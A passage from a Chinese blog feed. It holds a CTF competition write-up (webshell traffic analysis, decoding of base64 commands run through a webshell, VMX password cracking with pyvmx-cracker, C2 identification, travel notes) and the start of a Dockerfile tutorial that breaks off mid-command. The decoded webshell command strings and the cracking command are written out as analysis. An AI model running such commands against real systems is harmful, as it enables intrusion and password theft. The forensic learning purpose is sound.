alt="image-20211002141655424" loading="lazy"></p><p>只需要找到1.bin和2.bin的文件内容。而流量中，使用蚁剑流量来进行操作，利用<code>yijuhua.php</code></p><p>蚁剑流量看不懂，暂时也没研究，就先放了。只找到了234流中对应的/tmp/1.bin文件对应的内容。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002143352.png" alt="image-20211002143349731" loading="lazy"></p><h2 id="modbus"><a href="#modbus" class="headerlink" title="modbus"></a>modbus</h2><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002143524.png" alt="m0re_2021-09-25_17-30-21" loading="lazy"></p><p>看不懂，题目放这，做个纪念</p><h2 id="简单的加密样本"><a href="#简单的加密样本" class="headerlink" title="简单的加密样本"></a>简单的加密样本</h2><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002143659.png" alt="m0re_2021-09-25_17-30-26" loading="lazy"></p><p>与初赛机密内存差不多</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">":key/list/(pair/(phrase/UmBuYyhuIW8%3d/pass2key%3dPBKDF2%2dHMAC%2dSHA%2d1%3acipher%3dAES%2d256%3arounds%3d10000%3asalt%3d0kVDY4OIuvr2WAG%2bo639Lw%253d%253d,,JV9HGrSxPYiDk%2bJYP0KxHqceNnA%2fB0vLXtXVmrUSGINNbFmXRCX5smPN3Ny0hTcjtSGVTOXie5xUK2HdJaj6NxmgyTtc38Xy80co%2f3swAflWoKvMFxRB86AtVqZZ7Sv%2fbUAjCwVUd7uplXhLUfdCk12BMY0%3d))"</span><span class="token string">"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"</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002144058.png" alt="image-20211002144056231" loading="lazy"></p><p>很明显了，答案就是<code>vmx</code>文件</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002144007.png" alt="m0re_2021-09-25_17-30-32" loading="lazy"></p><p>这个题目没有发现正确的wp，赛后自己找到了一个可能为答案的可能，不知道对不对，贴下思路</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002145846.png" alt="image-20211002145843224" loading="lazy"></p><p>加密算法为<code>AES-256</code>，算法盐值<code>d24543638388bafaf65801bea3adfd2f</code></p><p>拼接后：<code>md5(AES-256d24543638388bafaf65801bea3adfd2f)</code>的值。不想进行加密了，估计也不对，看着有点不靠谱。有知道的大佬还希望指定一下。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002143942.png" alt="m0re_2021-09-25_17-30-38" loading="lazy"></p><p>直接使用脚本进行破解</p><pre class="language-bash" data-language="bash"><code class="language-bash">python pyvmx-cracker.py -v enc.vmx -d wordlist.txt</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002145455.png" alt="image-20211002145453880" loading="lazy"></p><p>本来的字典是没有这个密码的，是看过师傅们的wp看到了，也不知道哪里的字典有这么个奇怪复杂的密码。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002143921.png" alt="m0re_2021-09-25_17-30-44" loading="lazy"></p><h2 id="简单的流量分析"><a href="#简单的流量分析" class="headerlink" title="简单的流量分析"></a>简单的流量分析</h2><p>4.1 题目内容：</p><p>某公司服务器遭受到黑客的恶意攻击，公司立即请工程师开始应急工作，提取出该服务器的流量包。请根据u盘里的hack.zip文件进行分析。该服务器遭遇恶意攻击泄露了flag关键信息，信息为________。(此处答案格式为flag{xxx})</p><p>二分法盲注问题，盲注注入出flag内容，不过数据偏多，好像是差不多43个字符。两个队友都在手动进行查找(写的脚本跑了答案是错的)可以说花费了一个多小时在拼，也没完整无误的拼接出来。</p><p>4.2 题目内容：</p><p>攻击者入侵后曾植入webshell，请你分析攻击者利用它执行的命令为________。（如有多条命令请用#分开，按字母序排序，如ipconfig#net user，重复的命令只需要写一次，如命令中含有后缀名也得加上）</p><p>由于执行命令，且是利用<code>webshell</code>来执行，所以可以推测出方式是POST方式，且通过一个木马文件。于是</p><p>在数据包中，config.php的数据包，以POST提交的参数，就是执行命令的内容。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">Y2QgL2QgIkM6XFxjdGYiJmNvbmZpZy5leGUmZWNobyBbU10mY2QmZWNobyBbRV0</span><span class="token operator">=</span>Y2QgL2QgIkM6XFxjdGYiJmlwY29uZmlnJmVjaG8gW1NdJmNkJmVjaG8gW0VdY2QgL2QgIkM6L2N0ZiImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0VdY2QgL2QgIkM6L2N0ZiImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0VdY2QgL2QgIkM6L2N0ZiImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd</code></pre><p>解码后</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /d <span class="token string">"C:/ctf"</span><span class="token operator">&amp;</span><span class="token function">whoami</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>cd /d <span class="token string">"C:/ctf"</span><span class="token operator">&amp;</span><span class="token function">whoami</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>cd /d <span class="token string">"C:/ctf"</span><span class="token operator">&amp;</span><span class="token function">whoami</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>cd /d <span class="token string">"C:<span class="token entity" title="\\">\\</span>ctf"</span><span class="token operator">&amp;</span>ipconfig<span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>cd /d <span class="token string">"C:<span class="token entity" title="\\">\\</span>ctf"</span><span class="token operator">&amp;</span>config.exe<span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token builtin class-name">cd</span><span class="token operator">&amp;</span><span class="token builtin class-name">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span></code></pre><p>而且公告放了提示</p><blockquote><p>4.2：控制端存在部分混淆流量，题目命令为黑客通过终端执行命令。cd、echo命令不算</p></blockquote><p>所以最后答案就是<code>config.exe#ifconfig#whoami</code></p><p>4.3题目内容：</p><p>攻击者的c2服务器地址为________。</p><p>攻击者拿下一台机器来继续攻击，只需要看source和Dest的IP地址即可</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002152854.png" alt="image-20211002152849769" loading="lazy"></p><p>可以看到是<code>192.168.197.153</code>作为黑客的地址，受害者为<code>192.168.197.143</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002153027.png" alt="image-20211002153025162" loading="lazy"></p><p>当后来再看，写入木马后，使用POST方法执行一些命令，就是使用的<code>192.168.197.150</code>来进行了。所以可以看出黑客的c2服务器地址为<code>192.168.197.150</code></p><p>4.4 题目内容：</p><p>攻击者曾上传了远控后门，请你分析攻击者通过远控后门下载的文件名为________。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002153454.png" alt="image-20211002153451905" loading="lazy"></p><p>结合公告</p><blockquote><p>4.4获取的文件名包含后缀，并且提交的时候首字母大写再提交。</p></blockquote><p>所以答案为<code>Password.txt</code></p><h2 id="mem-sec"><a href="#mem-sec" class="headerlink" title="mem_sec"></a>mem_sec</h2><p>5.1 题目内容：</p><p>一日运维人员针对被入侵主机进行了一次内存分析，请根据内存镜像进行分析并回答下述问题。请根据u盘里的mem_sec.zip文件进行分析。取证人员首先对主机信息进行核实，该内存主机的产品密钥是____。（答案格式字符全部大写）</p><p>没找到，由于没网，能查的资料很少，而且还有就是取证资料收集的不够。</p><p>5.2 题目内容：</p><p>经过入侵分析发现该主机的使用人员曾经访问过匿名邮箱的网址是__________。(答案包含http://或者https://，答案最后没有/)</p><p>三次机会都没试对，脸黑🙁🙁🙁</p><p>后面不记了，都没出。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>出了XXE一个，还有SSRF一个。</p><p>通过这次才发现一点就是，以前的学习，只学习了漏洞的原理，怎么触发还有利用。但是没有考虑怎么修复啊。这个比赛确实学到了好多。</p><h2 id="旅游项目"><a href="#旅游项目" class="headerlink" title="旅游项目"></a>旅游项目</h2><p>吃</p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002160744.jpeg" style="zoom: 25%;" / loading="lazy"><img src="https://gitee.com/m0re/picture/raw/master/img/20211002160840.jpeg" style="zoom:33%;" / loading="lazy"><p>大锅台很赞。有机会还要去吃。</p><p>比赛现场还是挺燃的，只不过比赛时不让开机，没拍什么照片</p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002160947.jpeg" style="zoom:33%;" / loading="lazy"><p>没有什么比在酒店看熊出没更安逸的了hhhh</p><img src="https://gitee.com/m0re/picture/raw/master/img/20211002161103.jpeg" style="zoom:33%;" / loading="lazy"><p>还有兰州的景点，白塔山，五泉山，中山桥。都好好看的，兰州很美。小吃街的东西也好吃，羊杂汤，emmm就是有点贵。</p><p>唯一遗憾的就是没找到什么纪念品带回来。</p><p>兰州之旅，满足之至。</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线下赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerfile初探及指令详解</title>
      <link href="/posts/4e2b59b/"/>
      <url>/posts/4e2b59b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20210919234541.jpeg" alt="img" loading="lazy"><br>月光下有两个影子，一个是我的，另一个也是我的。</p><a id="more"></a><h2 id="Dockerfile概念"><a href="#Dockerfile概念" class="headerlink" title="Dockerfile概念"></a>Dockerfile概念</h2><p>Dockerfile就是一个文本文件，它是由一条一条指令构成的，每一条指令构建一层，所以，每一条指令都是在描述该层是如何构建的。</p><p>比如我这里定制一个nginx镜像</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginxRUN echo &#39;&lt;h1&gt;Hello, world&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</code></pre><p>这个dockerfile涉及的指令只有两个，<code>FROM</code>和<code>RUN</code></p><h2 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h2><p>既然要定制镜像，那么必须得以一个基础镜像为基础，然后进行雕琢，美化。像上面的哪个例子，就是以nginx为基础来创建的镜像。所以在Dockerfile中FROM必须是第一条指令，且必须存在。</p><p>在docker hub上有很多官方镜像</p><ul><li>服务类: nginx、redis、mongo、mysql、https、php、tomcat等等</li><li>语言应用类: python、ruby、golang、openjdk、node等等</li></ul><p>除去这些之外，如果还是没有找到你想要的镜像，官方还提供了一些更加基础的操作系统镜像。如: Ubuntu、debian、centos、fedora、apline等等</p><h2 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h2><p>RUN指令是用来执行命令行命令的，由于命令行强大的能力，RUN指令在定制镜像时是最常用的指令之一，它的格式也有两种</p><ul><li>shell格式：<code>RUN &lt;命令&gt;</code>，就像是直接在命令行输入的命令一样，上面的例子中的RUN就是shell格式。</li><li>exec格式：<code>RUN [&quot;可执行文件&quot;, &quot;参数一&quot;, &quot;参数二&quot;]</code>，这更像是函数调用中的格式。</li></ul><p>比如：</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN apt-get updateRUN apt-get install -y gcc libc6-dev make wgetRUN wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot;RUN mkdir -p &#x2F;usr&#x2F;src&#x2F;redisRUN tar -zxf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1RUN make -C &#x2F;usr&#x2F;src&#x2F;redisRUN make -C &#x2F;usr&#x2F;src&#x2F;redis install</code></pre><p>每一个指令都会建立一层，<code>RUN</code>也是，每次RUN都会建立一层，就像上面这种写法，是建立了七层。结果就是产生很多臃肿的镜像，毫无意义，比如在运行时不需要的内容，像编译环境，更新软件包等。这些增加构建层数，只会增加构建部署镜像的时间，且容易出错。</p><p>Union FS 是有最大层数限制的，比如 AUFS，曾经是最大不得超过 42 层，现在是不得超过 127 层。</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM debian:stretchRUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \    &amp;&amp; apt-get update \    &amp;&amp; apt-get install -y $buildDeps \    &amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \    &amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \    &amp;&amp; rm redis.tar.gz \    &amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \    &amp;&amp; apt-get purge -y --auto-remove $buildDeps</code></pre><p><code>/</code>是命令换行方式，<code>&amp;&amp;</code>命令连接，将前后命令串联起来，<code>#</code>注释符，一般在文件的首行进行编写，其它地方不再进行注释，否则可能会影响流程运行。</p><p>这里最后还清理了一下缓存<code>apt-get purge -y --auto-remove $buildDeps</code>，清理掉无关的东西。</p><h2 id="COPY-复制文件"><a href="#COPY-复制文件" class="headerlink" title="COPY 复制文件"></a>COPY 复制文件</h2><p>格式</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY [--chown&#x3D;&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;... &lt;目标路径&gt;COPY [--chown&#x3D;&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></pre><blockquote><p>和RUN指令一样，也是有两种格式，一种类似于命令行，一种类似于函数</p></blockquote><p><code>COPY</code>指令将从旁那个构建上下文的目录中<code>&lt;源路径&gt;</code>的文件/目录复制到新的一层镜像中的<code>&lt;目标路径&gt;</code>的位置。如：</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY flag.php &#x2F;var&#x2F;www&#x2F;html&#x2F;</code></pre><p>源路径可以是很多个，甚至可以是通配符。</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY hom* &#x2F;mydir&#x2F;COPY hom?.txt &#x2F;mydir&#x2F;</code></pre><p>目标路径可以是容器内的绝对路径，也可以是相对工作目录的相对路径，工作目录可以使用<code>WORDDIR</code>来指定，目标目录不需要事先创建，如果不存在会在复制文件之前自动创建缺失目录</p><p>使用<code>COPY</code>指令，源文件的各种元数据都会保留。比如读写执行权限，文件变更时间，这个特性对于镜像指定很有用。尤其是在使用Git进行管理的时候。</p><p>在使用该指令的时候，还可以加上<code>--chown=&lt;user&gt;:&lt;group&gt;</code>选项来改变文件的所属用户及用户组</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY --chown&#x3D;55:mygroup files* &#x2F;mydir&#x2F;COPY --chown&#x3D;bin files* &#x2F;mydir&#x2F;COPY --chown&#x3D;1 files* &#x2F;mydir&#x2F;COPY --chown&#x3D;10:11 files* &#x2F;mydir&#x2F;</code></pre><h2 id="ADD-更高级的复制文件"><a href="#ADD-更高级的复制文件" class="headerlink" title="ADD 更高级的复制文件"></a>ADD 更高级的复制文件</h2><p>这个也是复制的，它与COPY不同的一点是，它可以自动解压。并且它的源路径可以是一个url，如果源路径是个url的话，那么ADD指令就会调用Docker引擎去下载该链接的文件，然后将它放入目标路径中。</p><p>需要注意的是下载后的文件权限默认设置为600，如果不想要这个权限可以再加一层<code>RUN</code>指令进行修改权限。</p><p>如果下载的是个压缩包，需要解压缩，也同样是需要再加一层<code>RUN</code>来进行解压缩，所以有时候不如直接是同<code>RUN</code>指令，调用<code>wget</code>或者<code>curl</code>工具下载，处理权限，解压缩，然后清理文件更加合理。所以这个命令一般不常用。</p><p>如果源路径为一个<code>tar</code>压缩文件的话，压缩格式为<code>gzip</code>， <code>bzip2</code>，<code>xz</code>的情况下，<code>ADD</code>指令就会自动解压缩这个压缩文件到目标路径中去。</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM scratchADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz &#x2F;...</code></pre><p>如果在某些情况下，我们不想解压缩，想直接复制压缩文件，这个时候就不能使用<code>ADD</code>命令了。</p><p>所以可以考虑，所有文件的复制均使用<code>COPY</code>指令来执行，仅在需要自动解压缩的时候再使用<code>ADD</code></p><h2 id="CMD-容器启动命令"><a href="#CMD-容器启动命令" class="headerlink" title="CMD 容器启动命令"></a>CMD 容器启动命令</h2><p><code>CMD</code>指令的格式与<code>RUN</code>指令相似，同样为两种格式</p><ul><li><code>shell</code>格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code>格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li></ul><p>docker不是虚拟机，容器就是进程，再启动容器的时候，需要指定所运行的程序及参数，<code>CMD</code>指令就是用于指定默认的容器主进程的启动命令的。</p><p>在运行时可以指定新的命令来代替镜像设置中的这个默认命令，比如，在Ubuntu镜像中默认运行CMD是<code>/bin/bash</code>，如果我们直接使用<code>docker run -it ubuntu</code>那么，会直接进入<code>bash</code>。也可以在运行时指定运行别的命令，如：<code>docker run -it ubuntu cat /etc/os-release</code>，这样就是直接使用<code>cat /etc/os-release</code>命令替换了默认的<code>/bin/bash</code>命令。输出了操作系统的版本信息。</p><p>一般使用<code>exec</code>格式，这类格式在解析时会被解析为json数组，因此一定要使用双引号，==不要使用单引号==</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">shell格式CMD echo $HOME   &#x3D;&#x3D;&#x3D;   CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; ]</code></pre><p>在编写指令<code>nginx</code>服务开启命令时，需要使用命令<code>service nginx start</code></p><p>但是直接使用</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD service nginx start</code></pre><p>会出现一个问题，就是会被进程理解为</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;service nginx start&quot; ]</code></pre><p>这样的命令结束后，<code>sh</code>进程也就结束了，主进程结束推出，那么容器自然也就退出了。而且在容器中使用<code>systemctl</code>命令的话，会发现无法执行，正确的方法应该是</p><pre class="language-none"><code class="language-none">CMD [ &quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot; ]</code></pre><h2 id="ENV-设置环境变量"><a href="#ENV-设置环境变量" class="headerlink" title="ENV 设置环境变量"></a>ENV 设置环境变量</h2><p>格式有两种</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">ENV &lt;key&gt; &lt;value&gt;ENV &lt;key1&gt;&#x3D;&lt;value1&gt; &lt;key2&gt;&#x3D;&lt;value2&gt;...</code></pre><p>这个指令就是仅仅设置环境变量而已。无论是后面的其他指令还是运行时的应用，都可以直接使用这里定义的环境变量。</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">ENV VERSION&#x3D;1.0 DEBUG&#x3D;on \NAME&#x3D;&quot;Happy m0re&quot;</code></pre><p>比如在<code>node</code>镜像的<code>dockerfile</code>中</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">ENV NODE_VERSION 7.2.0RUN curl -SLO &quot;https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v$NODE_VERSION&#x2F;node-v$NODE_VERSION-linux-x64.tar.xz&quot; \  &amp;&amp; curl -SLO &quot;https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v$NODE_VERSION&#x2F;SHASUMS256.txt.asc&quot; \  &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \  &amp;&amp; grep &quot; node-v$NODE_VERSION-linux-x64.tar.xz\$&quot; SHASUMS256.txt | sha256sum -c - \  &amp;&amp; tar -xJf &quot;node-v$NODE_VERSION-linux-x64.tar.xz&quot; -C &#x2F;usr&#x2F;local --strip-components&#x3D;1 \  &amp;&amp; rm &quot;node-v$NODE_VERSION-linux-x64.tar.xz&quot; SHASUMS256.txt.asc SHASUMS256.txt \  &amp;&amp; ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nodejs</code></pre><p>一开始设置了node的版本，下面直接使用<code>$NODE_VERSION</code>代表的就是<code>7.2.0</code>，这样做的好处就是更新的话，直接更改环境变量中定义的版本信息，也就是<code>7.2.0</code>即可。</p><h2 id="CTF出题docker编写"><a href="#CTF出题docker编写" class="headerlink" title="CTF出题docker编写"></a>CTF出题docker编写</h2><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nickistre&#x2F;centos-lamp:latestCOPY src&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;RUN &#x2F;etc&#x2F;init.d&#x2F;mysqld start \    &amp;&amp; mysqladmin -uroot password &#39;ctfhub&#39; \    &amp;&amp; mysql -e &quot;CREATE DATABASE ctfhub DEFAULT CHARACTER SET utf8;&quot; -uroot -pctfhub \    &amp;&amp; mysql -e &quot;use ctfhub;source 